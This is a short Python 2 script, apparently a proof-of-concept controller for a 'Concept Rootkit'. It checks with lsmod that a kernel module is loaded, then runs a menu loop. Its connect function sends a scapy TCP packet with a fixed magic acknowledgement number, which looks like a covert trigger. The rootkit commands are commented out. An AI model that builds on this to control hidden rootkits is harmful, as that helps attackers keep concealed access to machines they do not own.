#!/usr/bin/env python
import os, sys
from scapy.all import *


def handler_check():
	print "<rCMD> Making sure 'server_handler' is running as a module."
	print "<rCMD> As of right now, IP = 192.168.56.200, Port = 14685. "
	handler_check = os.system("lsmod | grep 'example'")
	if (handler_check):
		print "<rCMD> server_handler is not running. Terminating."
		sys.exit(1)
	else:
		print "Good to go. Presenting command line."


def get_command():
	proper = 0

	while not proper:
		try:
			command = int(raw_input("	> "))
			if (command <= 20 and command >= 0):
				proper  = 1
			else:
				print "	<rCMD> Invalid value."
		except ValueError:
			print "	<rCMD> Invalid option."

	return command


def menu():
	print """ 
	+ Command Handler for Concept Rootkit +
	---------------------------------------
	-> Handler Commands
		0) Show options (print this menu).
		1) Exit this program.
	-> Rootkit Commands
		2) Issue 'connect' command.
		3) Issue 'disconnect' command.
	"""


def connect():
	sr(IP()/TCP(ack=2035414082))

commands = {
	0 : menu,
	1 : sys.exit,
	#2 : connect,
	#3 : disconnect
}

def handle_command(command):
	commands[command]()


handler_check()
menu()
while 1:
	command = get_command()
	handle_command(command)